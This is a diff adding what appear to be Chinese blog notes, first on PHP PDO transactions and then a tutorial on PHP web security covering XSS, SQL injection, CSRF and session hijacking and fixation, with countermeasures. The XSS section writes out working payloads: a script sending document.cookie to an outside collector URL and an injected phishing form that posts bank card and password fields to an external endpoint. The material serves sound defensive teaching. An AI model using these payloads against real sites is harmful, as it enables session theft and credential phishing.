+	// 事务: 将 多条sql语句绑定为一个整体, 其中有任意一条sql 失败, 则整体失败.
+	// 	
+	// 	MyISAM 不支持事务 
+
+	// 	InnoDB 支持事务
+
+
+	// 自动提交:
+	// 	默认情况下, sql一旦执行, 就会立马改变sql的状态
+	// 	关闭自动提交, sql一旦执行, 能得到sql的状态结果, 但是sql不会真正的改变
+
+	
+	try {
+		$pdo = new PDO('mysql:host=localhost;dbname=s86;charset=utf8','root','pass');
+	} catch (Exception $e) {
+		echo '数据库链接失败'; die;
+	}
+
+
+	// 事务操作步骤
+
+	try {
+		// 1. 关闭自动提交
+			$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 0);
+
+		// 2. 开启一个事务 (游戏中的存档)
+			$pdo->beginTransaction();
+
+		// 3. 执行sql
+			# 1) 扣钱  -10W 
+			$sql = "UPDATE `salary` SET  `money`=`money`-100000 WHERE `uid` = 5 ";
+			$rows = $pdo->exec($sql);
+			if($rows < 1){
+				throw new Exception('工资转出失败');
+			}
+
+			# 2) 加钱  +10W
+			$sql = "UPDATE `salary` SET  `money`=`money`+100000 WHERE `uid` = 4 ";
+			$rows = $pdo->exec($sql);
+			if($rows < 1){
+				throw new Exception('工资转入失败');
+			}
+
+
+		// 4. 执行成功, 提交事务, 真正的改变sql状态
+			$pdo->commit();
+
+	} catch (Exception $e) {
+		// 4. 执行失败,  回滚事务, 回到开始事务时的sql状态
+		echo $e->getMessage();
+		$pdo->rollBack();  # 读档
+	}
+	
+
+	// 5. 开启自动提交
+	$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 1);
+
+
+
+
+```
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>后端 - MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP编码安全及常见攻击</title>
+    <url>/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[
+# PHP编程安全
+
+## Cookie简介
+
+HTTP是一种**无状态协议**, 即不对请求和响应之间的通信状态进行保存. 也就是说, 无法根据之前的状态关联本次的请求处理. 目的是更快的处理大量事务, 确保协议的可伸缩性
+
+为了解决这个问题, 引入**Cookie**. 客户端第一次访问服务时, 服务器生成Cookie, 通过响应发送给客户端, 并记录该Cookie对应的客户会话信息. 之后当客户端携带Cookie访问服务器时, 服务器就可以辨识本次请求的来源用户身份
+
+![image-20220908094428755](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b1eb843bebdf74317d35b9d48641ce1-fc2d819.png)
+
+## Web安全总览
+
+Web攻击可分为**主动攻击**(Active Attack) 和 **被动攻击**(Passive Attack)
+
+### 主动攻击
+
+攻击者直接攻击Web服务器, 如SQL注入等
+
+![image-20220908095458915](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a4f1d6afddf1b00bbeb932b988eb3ec-73541a8.png)
+
+### 被动攻击
+
+攻击者不直接攻击服务器, 而是针对网站用户设下陷阱, 利用掉入陷阱的用户来获取修改用户数据或攻击应用程序
+
+- **模式一 单纯被动攻击**
+
+  ![image-20220908095818486](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/231f512a97705bc18fdefad67c6a1cf3-40aae6f.png)
+
+  用户在浏览过所谓的“可疑网站"之后会感染上恶意软件。理论上如果浏览器（包括Adobe Flash Player等插件）不存漏洞，此类单纯的被动攻击是行不通的。但现实中，浏览器以及Adobe Reader、Adobe Flash Player、JRE 等插件的漏洞却层出不穷
+
+- **模式二 在正规网站中设置陷阱的被动攻击**
+
+  ![image-20220908100156321](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b18347cab7175548a852fea3020196b8-fe0b8a0.png)
+
+  攻击者示先入侵正规网站，往箕内容中嵌入恶意代码（①）。网站用户在浏览了含有恶意代码的内容后（②、③），就会感染病毒（④）。在这一流程中，单看步骤①的话似乎应归类为主动攻击，但步骤②、③均为被动攻击，因此可将①视作被动攻击的前期准备。
+
+  | 设置陷阱 | 手法                                                         |
+  | :------: | ------------------------------------------------------------ |
+  |    1     | 非法获取FTP等服务器密码后篡改网站内容                        |
+  |    2     | 通过攻击Web服务器的安全漏洞篡改网站内容                      |
+  |    3     | 通过SQL注入篡改网站内容                                      |
+  |    4     | 在社交网络这类用户可以自己发布内容的网站, 利用跨站脚本漏洞实施攻击 |
+
+- **模式三 跨站被动攻击**
+
+  ![image-20220908100654086](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c94125098751edd51f007d625fd14d7-7505744.png)
+
+  此类攻击的特征为，恶意利用已经在正规网站登录的用户账号来实施攻击。由于步骤③的请求中要向正规网站发送会话Cookie，因此，如果用户己经在正规网站登录，就会利用其己经登经的状态实施攻击。
+
+  此类攻击模式的典型案例包括，在步骤③的请求中对Web应用发动攻击的**跨站请求伪造(CSRF)**，以及在步骤④的响应中利用浏览器来执行攻击的**跨站脚本攻击(XSS)**和**HTTP消息头注入攻击**。
+
+### 浏览器防御被动攻击
+
+针对被动攻击，浏览器和网站都需要采取相应的防御措施。如果浏览器存在安全问题，网站方面即使实施了对策也无法完全确保安全性。
+
+#### 浏览器安全功能一
+
+浏览器能在用户浏览网站的同时运行一些程序，比如JavaScript、 Java Applet、Adobe Flash Player、 ActiveX等。而为了防止恶意程序在用户的浏览器上运行，JavaScript等语言提供了一些增强安全性的功能。基本思想有如下两种:
+
+- **CA签名确认** 只有在用户确认了程序的发行方并允许运行的情况下，程序才能被运行
+- **Sandbox** 提供限制程序权限的沙盒环境(禁止访问本地文件/禁止使用打印机/限制网络访问)
+
+#### 浏览器安全功能二
+
+**同源策略** - 协议、域名(指向主机)、端口，这三个完全相同的 URL 才能称之为同源
+
+如果同源, 在iframe外部就可以通过JS取得内部的HTML内容
+
+- **同源**
+
+  ![image-20220908105931524](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e5c7018912f2d264a4e741517f62fb6f-bc89a16.png)
+
+- **非同源**
+
+  ![image-20220908110234735](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ae444459dddc7737b6fd57372544a3bd-cfebaf8.png)
+
+### 应用程序安全隐患
+
+虽然浏览器的同源策略为抵御被动攻击设下了一道屏障，但如果应用程序中存在安全隐患，还是有可能遭受到被动攻击。跨站脚本攻击(XSS)就是典型的例子。
+
+![image-20220908112611999](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bcfdfc16356c795428f24d58587fff1b-e9abeb0.png)
+
+### Web应用功能与安全隐患关系
+
+![image-20220908112751743](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06491573400c70b760d123855f2b0951-4019c91.png)
+
+Web应用可以使用 **输入-处理-输出** 模型表示, 从HTTP请求输入开始, 经过服务器应用的各种处理, 最后由HTTP响应进行输出. 而除了HTTP响应, 此处的输出还包括访问数据库、读写文件、收发邮件等与其他服务交流的操作
+
+| 输出             | 安全隐患       | 恶意手段              | 数据边界符 |
+| ---------------- | -------------- | --------------------- | ---------- |
+| 输出HTML         | 跨站脚本       | 注入JavaScript等      | `<` |  `"` |
+| 输出HTTP消息头   | HTTP消息头注入 | 注入响应消息头        | 换行符     |
+| 执行SQL语句      | SQL注入        | 注入SQL命令           | `'` | `--` |
+| 调用Shell命令    | OS命令注入     | 注入系统命令          | `;` | `\|` |
+| 输出邮件头和正文 | 邮件头注入     | 注入/修改邮件头或正文 | 换行符     |
+
+## 页面显示相关问题
+
+### 跨站脚本XSS
+
+通常情况下, 在Web应用的网页中, 有些部分的**显示内容会依据外界输入值而发生变化**(会反弹恶意代码), 而如果生成这些HTML的程序中存在问题，就会滋生**跨站脚本(Cross-Site Scripting)**安全隐患. 由于和知名的CSS(层叠样式表)缩写冲突, 所以经常缩写为**XSS** 
+
+Web应用若存XSS漏洞, 会有下列风险:
+
+- 用户的浏览器中运行攻击者的恶意脚本，从而导致Cookie信息被窃取，用户身份被冒名顶替
+- 攻击者能获得用户的权限来恶意使用Web应用的功能
+- 向用户显示伪造的输入表单，通过钓鱼式攻击(Phishing)窃取用户的个人信息
+
+| 对象         | 结果                                                       |
+| ------------ | ---------------------------------------------------------- |
+| 产生地点     | Web应用中生成HTML和JavaScript的位置                        |
+| 影响范围     | Web应用全体                                                |
+| 影响类型     | 在网站用户的浏览器中执行JavaScript, 显示伪造的网站内容     |
+| 影响程度     | 中 ~ 大                                                    |
+| 用户参与程度 | 需要: 浏览恶意网站、点击邮件附属链接、浏览已经被入侵的网站 |
+| 对策概要     | 双引号括起属性值, 转义HTML中的特殊字符                     |
+
+#### 窃取Cookie
+
+- 1.目标页面: 对用户输入没有做任何处理, 复现在页面上
+
+  ![image-20220908124242361](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73852fd699e8745eab4e9ed6e7052b5e-a581dcd.png)
+
+- 2.输入简单的JavaScript注入
+
+    ```js
+    <script> alert(document.cookie) </script>
+    ```
+
+    ![image-20220908124549687](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b88a194f1c00e444a2e181857f6b295c-ad70927.png)
+
+- 3.构建钓鱼页面, 诱使用户点击
+
+  ![image-20220908140815830](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2408d519e6b0598afbbed974528cff9-bc0d1aa.png)
+
+  ```html
+  <iframe width="300" height="200" src="http://localhost/test/WebSecure/cookie/search.php?item=<script>window.location='http://ni9ne.com.cn/collectCookie.php?sid='%2Bdocument.cookie;</script>"></iframe>
+  ```
+
+- 4.查看结果
+
+  ![image-20220908141430251](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9fe06249a4c3f49f740f5241159a76ce-bebfdd9.png)
+
+#### 篡改网页
+
+- 1.目标页面
+
+  ![image-20220908171049197](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dda1006bebd359ef7d60210ffea107f3-2180dc8.png)
+
+  ![image-20220908171109548](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b8b7380fecd34839627c7e99d8fdad2-e6811c0.png)
+
+- 2.构建钓鱼页面, 诱使用户点击
+
+  ![image-20220908171448002](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f4abb263cbb83f3d632dd8ea05b1e7cd-ad0da87.png)
+
+  ```html
+  <input type="hidden" name="name" value='
+  	"></form>
+  	<form style="top:5px;left:5px;position:absolute;z-index: 99;background-color: white;" action="http://ni9ne.com.cn/phishing_order_res.php" method="POST">
+   	<h1>预约报名</h1>
+   	姓名 <input type="text" name="name" size="20" value="ni9ne"><br>
+   	地址 <input type="text" name="addr" size="20" value="佳园路111号"><br>
+   	电话 <input type="text" name="tel" size="20" value="15988954253"><br>
+   	银行卡号 <input type="text" name="card" size="20" value="xxxxxx"><br>
+   	登陆密码 <input type="text" name="pwd" size="20" value="xxxxxx"><br>
+   	<input type="submit" value="预约">
+   	<br><br><br><br>
+   	</form>
+  '>
+  ```
+
+  
+
+- 3.用户点击, 查看结果
+
+  ![image-20220908171859666](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dca607ff717a43a2a94bb15aa3b9ab28-0d72f5c.png)
+
+  ![image-20220908172054985](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/33800ebd86c306a90c6a2ae2f68f2403-a1265f1.png)
+
+**攻击原理**:
+
+恶意网页通过下列手段隐藏原来的form并添加新的form, 从而改变页面
+
+1.使用 `"></form>` 闭合原有form元素
+
+2.添加新的form元素, 并通过指定样式方式赢藏原有form
+
+- 通过固定绝对坐标方式将form固定
+
+- 将`z-index` 设置为最大值, 确保悬浮在原有form上方
+
+- 将背景指定为网站整体背景色, 隐藏原有form
+
+3.在新的form中指定提交目标为恶意网站
+
+#### href/src属性XSS
+
+有些元素的属性值为URL, 如 `a` 元素的 `href` 属性, `img` 、`frame` 、`iframe` 元素的 `src` 属性. 如果属性值中的URL是由外界传入, 就可能通过使用 `javascript: js代码` 形式的URL执行JavaScript代码. 
+
+- 1.目标页面
+
+  ![image-20220908181539429](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/daeccb79ee0b5bde3f46f97222071318-16f97e5.png)
+
+  ![image-20220908181738586](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d79d85c52814b41c936fd3166afc7088-b7b0265.png)
+
+- 输入js代码
+
+  ```js
+  javascript:alert(document.cookie)
+  ```
+
+  ![image-20220908182004565](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8c94882ee92d3c129313650a4024415d-87a7746.png)
+
+**对策**:
+
+URL由程序动态生成时, 需要对其进行校验, 仅允许 http 和 https协议. 此外, 通过校验的URL还需要作为属性值进行HTML转义. 即URL属性必须满足两个条件中的一个:
+
+- 以 `http:` 或 `https:` 开头的绝对URL
+- 以 `/` 开头的相对URL
+
+#### JavaScript的动态生成
+
+Web应用中, 服务器依据客户输入动态生成一部分JavaScript. 可能存在js注入风险
+
+- 1.目标页面
+
+  ![image-20220908183951550](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/318dd6c2c614ccacda91cd24903c5879-7fbb498.png)
+
+  ![image-20220908184057779](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bae27fc34c07da5071be9c8a26b1e2da-ef7ff12.png)
+
+- 输入JS代码
+
+  ```
+  ');alert(document.cookie)//
+  ```
+
+  ![image-20220908184224255](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/960c3dd4af25438caec235bdac842896-deb7ac0.png)
+
+  实际页面变为:
+
+  ![image-20220908184424050](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a795e0d4a8d02b584b41049bf33d930e-d99973b.png)
+
+**对策**:
+
+需要对JavaScript字符串进行转义, 避免单引号 `'` 被作为结束边界符
+
+- 将数据作为js字符串进行转义
+- 将得到的结果再次进行html实体化
+
+| 原字符                  | JavaScript转义后           | HTML实体化后                              |
+| ----------------------- | -------------------------- | ----------------------------------------- |
+| `<`  `>`  `'`  `"`  `\` | `<`  `>`  `\'`  `\"`  `\\` | `&lt;`  `&gt;`  `\&#39;`  `\&quot;`  `\\` |
+
+> 或直接使用Unicode转义, 将字母数字之外的字符转为Unicode
+
+### 错误报告导致信息泄露
+
+错误信息泄露存在以下两种状况:
+
+- 错误信息中含有对攻击者有帮助的应用程序内部信息
+- 通过蓄意攻击使错误信息中显示隐私信息(如用户名/密码等)
+
+PHP可以配置关闭错误显示
+
+```properties
+# php.ini
+display_errors = Off
+```
+
+## 页面显示相关问题解决方案
+
+### XSS分类
+
+XSS主要分为**反射型XSS**和**存储型XSS** 
+
+- 反射型XSS(Reflected XSS)
+
+  攻击用的JS代码位于攻击目标网站之外的其他网站(恶意网站或邮件中的URL)
+
+  如窃取Cookie中使用的用户输入值确认页面
+
+  ![image-20220908173455951](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98982edad9d258e8a6a9b88101f2f50f-b9b1923.png)
+
+- 存储型XSS (Stored XSS)
+
+  也叫持久性XSS(Presistent XSS), 攻击用JS代码保存在攻击对象服务器上
+
+  典型攻击对象为Web邮箱客户端及社交网站发布页
+
+  ![image-20220908173536032](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1918ea18397b8b65c234a533029a1caf-d661208.png)
+
+### XSS产生根源
+
+根本原因是在生产HTML过程中, HTML语法中的关键字(元字符)没有被正确处理, 导致HTML/JS被注入, 从而导致原有页面结构变化.
+
+为了消除关键字的特殊意义, 将其转化为普通字符, 就需要进行转义/实体化处理
+
+```
+转义规则: http://www.w3chtml.com/html/character.html
+```
+
+### 解决方案
+
+参数所在位置转义方式:
+
+| 位置                 | 说明                                             | 最低限度转义内容                    |
+| -------------------- | ------------------------------------------------ | ----------------------------------- |
+| 元素内容             | 1.能解释Tag和字符实体<br />2.结束边界字符为 `<`  | `<`  `&`                            |
+| 属性值               | 1.能解释字符实体<br />2.结束边界字符为双引号 `"` | 属性值用双引号括起来, `<`  `&`  `"` |
+| 属性值(URL)          | 同上                                             | 校验URL格式正确后按属性值规则转义   |
+| 事件绑定函数         | 同上                                             | 转义JavaScript后按属性值规则转义    |
+| Script元素中的字符串 | 不能解释Tag和字符实体<br />结束边界字符为`</`    | 转义JavaScript并避免出现 `</`       |
+
+- PHP中一般使用 `htmlspecialchars($string, $quote_style, $charset)` 函数进行实体化转义, 如:
+
+    ```php
+    echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+    ```
+    
+- 输入校验, 通过校验用户输入值的有效性, 防御XSS攻击
+
+- 给Cookie添加`HttpOnly`属性, 禁止 JavaScript 读取Cookie信息
+
+    ```properties
+    # php.ini
+    session.cookie_httponly = 1
+    ```
+
+## SQL调用相关问题
+
+### SQL注入
+
+SQL注入漏洞是由于SQL语句的调用方法不完善而产生的安全隐患. 导致的结果一般是直接对服务器的攻击, 而不需要用户的参与, 可能造成以下影响:
+
+- 数据库信息被窃取
+- 数据库内容被篡改
+- 登陆认证失效
+- 其他如, 服务器文件被读取/修改, 服务器程序执行
+
+| 对象         | 结果                                       |
+| ------------ | ------------------------------------------ |
+| 产生地点     | 调用SQL语句的地方                          |
+| 影响范围     | 所有页面                                   |
+| 影响类型     | 信息泄露、篡改数据、绕过认证、浏览编辑文件 |
+| 影响程度     | 大                                         |
+| 用户参与程度 | 不需要                                     |
+| 对策概要     | 使用静态占位符, 预编译模式运行SQL          |
+
+SQL注入攻击方式多种多样 , 暂不具体展开, 后续开专题详细介绍, 应对方式一般使用静态占位符预编译即可
+
+```php
+$sql = "select * from tb_user where name = ? and pwd = ? limit 1";
+$pdo_stmt = $mysql->prepare($sql);
+$pdo_stmt->execute($dataArray);
+$result = $pdo_stmt->fetchAll();
+```
+
+ **其他辅助对策**:
+
+- 不显示详细错误信息 
+- 校验输入值有效性
+- 设置数据库权限
+
+## 关键处理中引入的安全隐患-CSRF
+
+关键处理中如果存在安全隐患, 可能产生跨站请求伪造(CSRF)的漏洞
+
+> 关键处理  - 账号转账/发送邮件/密码更改 等一旦完成无法撤销的操作
+>
+> CSRF  -   跨站请求伪造Cross-Site Request Forgery
+
+执行关键处理前, 需要确认请求确实是用户自愿发起的. 如果存在CSRF漏洞, 可能造成:
+
+- 攻击者使用用户的账号 下单购物/发帖
+- 攻击者删除用户账号
+- 攻击者更改用户的密码/邮箱
+
+| 对象         | 结果                                                         |
+| ------------ | ------------------------------------------------------------ |
+| 产生地点     | 以下任意网站上执行关键处理的页面:<br />- 仅使用Cookie进行会话处理的网站<br />- 仅依靠HTTP认证、SSL证书、手机移动ID标识用户的网站 |
+| 影响范围     | 存在CSRF漏洞的页面                                           |
+| 影响类型     | 以用户权限执行关键处理                                       |
+| 影响程度     | 中 ~ 大                                                      |
+| 用户参与程度 | 需要 -> 点击恶意链接、浏览恶意网站                           |
+| 对策概要     | 执行关键处理前, 确认是正规用户发起请求                       |
+
+### 典型攻击模式
+
+- 1.目标页面
+
+  ![image-20220909112236956](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e83386364b6d0c26fe9c4214ee39c687-2d6293d.png)
+
+  ![image-20220909112353922](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5118161300b4a391b533193c1bccdab5-61b4e6f.png)
+
+  整个页面工作流程为: 
+
+  - 确认用户登陆状态, 显示修改密码链接
+  - 用户输入新密码, 通过POST将信息传入后台处理脚本
+  - 后台接收数据, 修改当前用户密码并回显
+
+- 2.构建钓鱼页面, 诱使用户点击
+
+  ![image-20220909112735590](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c2e47deac0e92cbcb8e8871d901fca62-9e3ee52.png)
+
+  ![image-20220909112934443](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b58b688040bbd7cb0da4c8ed422bb4c-7adf890.png)
+
+- 3.攻击流程
+
+  ![image-20220909113243497](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f0a5d4d6507941ee1ba6e1ff843bc96c-e833054.png)
+
+  根据同源策略, iframe外层(恶意网页) 无法读取到内部(目标网页) 的内容, 因此, CSRF攻击无法获取目标的内容, 但可以模拟用户操作, 使用当前用户的Cookie修改用户密码, 从而达到攻击目标
+
+### 解决方案
+
+防御CSRF关键为 确认关键处理的请求确实是来自正规用户自愿发起的. 因此需要执行以下两点:
+
+- 筛选需要防范CSRF攻击的页面(关键处理页面)
+- 使代码能判断当前操作是否为用户主观行为
+
+**确认正规用户自愿发起请求方式**:
+
+![image-20220909113900268](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7108dd61f870ad1561862b1699c67401-c636235.png)
+
+- 嵌入机密信息(令牌)
+
+  ```php
+  # 关键页面
+  <input type="hidden" name="token" value="<?php echo htmlspecialchars(session_id) ?>">
+  
+  # 后台处理
+  if (session_id() !== $_POST['token']) die('请从正规页面操作');
+  ```
+
+- 再次输入密码
+
+  发送确认短信/输入密码, 确保是用户自愿发起, 但需要保证确认密码页面是最后的执行页面, 否则可能被跳过
+
+- 检验Referer
+
+  ```php
+  if ($_SERVER['HTTP_REFERER'] !== WEB_HOST) die('REFERER检测失败');
+  ```
+
+**防范策略比较** 
+
+|              | 嵌入令牌                   | 确认密码                   | 确认REFERER             |
+| ------------ | -------------------------- | -------------------------- | ----------------------- |
+| 开发耗时     | 中                         | 中                         | 小                      |
+| 用户影响     | 无                         | 增加输入密码步骤           | 关闭Referer用户无法使用 |
+| 手机网站适用 | 可以                       | 可以                       | 不可以                  |
+| 建议使用位置 | 基本策略, 所有情况均可适用 | 防范他人伪装需求较强的页面 | 可以限定用户环境        |
+
+### 辅助性对策
+
+执行关键处理后, 可以向用户注册邮箱发送相关处理内容的通知, 让用户第一时间知情, 降低损害
+
+
+
+![image-20220907102354779](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/328a63fa24f412a96b28b834b403439a-5a51513.png)
+
+![image-20220907103556039](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2afb282f2858018f2b14df3039376f8-88adc0d.png)
+
+![image-20220907105331970](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e34eb616c1d76ff51216bce014492c01-de36d7a.png)
+
+
+
+方式:
+
+![image-20220907111639726](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eb62cbdb2cbcc7351eb9f5295f853ad4-c050011.png)
+
+检查Referer
+
+![image-20220907111539038](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/07b0207e96cdca12ab1fa484c79b5dbb-0c30532.png)
+
+嵌入机密令牌(Token )
+
+![image-20220907110830638](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/307a2ad70df94ae2f31ccddf3e6e993b-d54d5c6.png)
+
+再次输入密码/短信确认信息
+
+(密码确认需要在最后一个执行确认节点, 否则还是存在CSRF漏洞)
+
+辅助对策: 执行关键处理后, 向注册邮箱发送通知
+
+## 不完善的会话管理
+
+Web应用中经常使用会话管理机制来记忆认证结果等状态. 一般使用**Cookie**记忆当前**会话ID**, 因此, 会话ID的作用相当于获取服务器端信息的钥匙
+
+如果由于某些原因, 用户的会话ID被第三方得知, 就会出现他人伪装用户访问的风险, 这种攻击手段就称为**会话劫持**
+
+### 第三方获取会话ID方式
+
+- 预测 会话ID
+- 窃取 会话ID
+- 挟持 会话ID
+
+![image-20220907113217019](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40db245eb8a5306c5cf9a36661a4b498-0bbf153.png)
+
+#### 预测会话ID
+
+如果生成会话ID的方式不妥善, 可能会被第三方预测成功, 如连续的数值, 基于日期、用户名生成, 开源软件中可预测的生成代码逻辑等
+
+#### 窃取会话ID
+
+窃取会话ID方式有以下几种:
+
+- 生成时Cookie属性设置不妥善(httponly)
+
+- 明文传输, 被网络监听
+
+- 由于跨站脚本安全隐患泄露
+
+- PHP或浏览器平台安全隐患泄露
+
+- 会话ID在URL中使用, 经由Referer泄露(支持发布外链)
+
+可能导致安全隐患:
+
+- 跨站脚本攻击(XSS)
+- HTTP消息头注入
+- 嵌入在URL中的会话ID
+
+#### 劫持会话ID
+
+将**会话ID**强制设置到用户浏览器中, 也就相当于攻击者得知了用户的会话ID, 称为 **会话固定攻击**(Session Fixation Attack)
+
+### 安全隐患
+
+#### 会话ID可预测
+
+| 对象         | 结果                                                     |
+| ------------ | -------------------------------------------------------- |
+| 产生地点     | 生成会话ID的地方                                         |
+| 影响范围     | Web应用使用会话管理的所有页面                            |
+| 影响类型     | 伪装用户                                                 |
+| 影响程度     | 大                                                       |
+| 用户参与程度 | 不需要                                                   |
+| 对策概要     | 停止自己实现会话管理机制, 而使用平台或语言提供的会话机制 |
+
+**攻击步骤**:
+
+- 1.收集对象应用的会话ID
+- 推测会话ID生成规则
+- 在对象应用中实验生成的会话ID
+
+**常见会话ID生成方式**:
+
+会话ID一般都是基于以下内容生成:
+
+- 用户ID或邮箱地址
+
+- 远程IP地址
+
+- 日期与实践(UNIX时间戳或年月日时分秒字符串)
+
+- 随机数
+
+![image-20220909121157721](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a669e5ba0cdd20ed1a9ef61c58f80536-7d6b5a0.png)
+
+**对策**:
+
+为了避免生成可预测的会话ID产生安全隐患, 应当停止自己实现会话管理机制, 而使用平台或语言提供的会话机制
+
+#### 会话ID嵌入URL
+
+会话ID有时并不保存在Cookie中, 而是被保存于URL. 由于一些手机浏览器不支持Cookie, 因此这种做法也经常使用
+
+```
+http://example.com/login.php?PHPSESSID=onjic14un02ccjqilsq8uq8as0
+```
+
+会话ID嵌入URL可能导致会话ID经由Referer外协, 从而造成伪装攻击
+
+| 对象         | 结果                              |
+| ------------ | --------------------------------- |
+| 产生地点     | 生成会话ID的地方                  |
+| 影响范围     | Web应用使用会话管理的所有页面     |
+| 影响类型     | 伪装用户                          |
+| 影响程度     | 中 ~ 大                           |
+| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
+| 对策概要     | 在程序中设置禁止嵌入会话ID到URL   |
+
+**PHP会话设置**
+
+```properties
+# php.ini
+## 使用Cookie保存会话ID, 默认On(1)
+session.use_cookies = 1	  
+## 仅将会话ID保存在Cookie, 默认On(1)
+session.use_only_cookies = 1
+## 自动将会话ID嵌入URL, 默认Off(0)
+session.use_trans_sid = 0
+```
+
+配置使用效果
+
+| use_cookies | use_only_cookies | 会话ID保存位置                                   |
+| ----------- | ---------------- | ------------------------------------------------ |
+| On          | On               | 会话ID仅保存在Cookie中                           |
+| On          | Off              | 可以使用Cookie时保存在Cookie中,不能使用时嵌入URL |
+| Off         | On               | 无意义组合                                       |
+| Off         | Off              | 始终将会话ID嵌入URL                              |
+
+> 上述情况中, `session.use_trans_sid`值为`On`时, 会话ID会自动嵌入URL, `Off`时, 仅在需要嵌入时, 才会嵌入
+
+**攻击案例**
+
+```properties
+# php.ini
+session.use_cookies = 0	  
+session.use_only_cookies = 0
+session.use_trans_sid = 1
+```
+
+构建钓鱼页面, 诱使用户点击
+
+![image-20220909163655413](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2b8ab5ee31afaa29daf9c8c1a74f4207-bb9d70b.png)
+
+![image-20220909163754243](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c36eafce4a03d2075ef093ed3898ae68-b5a86ae.png)
+
+
+
+**攻击条件**
+
+网站同时满足以下两个条件是, 存在会话ID失窃的风险
+
+- 能够使用被嵌入URL的会话ID
+- 存在跳转至外部网站的链接. 或用户可以发布自己的链接
+
+**对策**
+
+PHP设置仅使用Cookie保存会话ID, 不开启嵌入URL配置, 即默认配置
+
+#### 固定会话ID
+
+会话攻击的另一种手段为从外部劫持会话ID, 即会话固定攻击. 攻击流程如下:
+
+- 1.取得目标网站的会话ID或自己指定ID
+- 2.强行将上述会话ID交给用户
+- 3.用户登陆目标Web应用
+- 4.攻击者使用该会话ID伪装用户进入Web应用
+
+> 应对会话固定攻击时, 彻底杜绝步骤2比较困难, 因此一般采用用户登陆时更换其会话ID的方式
+
+| 对象         | 结果                              |
+| ------------ | --------------------------------- |
+| 产生地点     | 进行登陆处理的页面                |
+| 影响范围     | Web应用使用会话管理的所有页面     |
+| 影响类型     | 伪装用户                          |
+| 影响程度     | 中 ~ 大                           |
+| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
+| 对策概要     | 用户登陆时更换会话ID              |
+
+**攻击案例**
+
+```properties
+# php.ini
+session.use_cookies = 1 
+session.use_only_cookies = 0
+session.use_trans_sid = 1
+```
+
+- 1.目标页面, 登陆
+
+  ![image-20220909170628330](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b029b662b01229f0d4a3e1d58e7e8921-52f46f7.png)
+
+  ![image-20220909170746289](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c6eb98a75be2fef804edcc6b72faa0c3-360995f.png)
+
+- 构建钓鱼链接, 诱使用户点击登陆
+
+  ![image-20220909170828538](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/406bdbd2f8cdff7b0e0209bb84556f25-52c8aac.png)
+
+  ![image-20220909171110803](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3926a67c19a11654e615926244a565fe-f5e8eee.png)
+
+**对策**
+
+由于框架/平台存在**会话采纳(Session Adoption)**机制, 会采用预先提供的会话ID来生成会话. 存在以下对策:
+
+- **方案一 认证登陆后更改会话ID**
+
+  PHP中可以使用函数 `session_regenerate_id()` , 当指定参数为`ture`时, 会自动生成新的会话ID. 格式如下:
+
+  ```php
+  bool session_regenerate_id([bool $delete_old_session = false])
+  ```
+
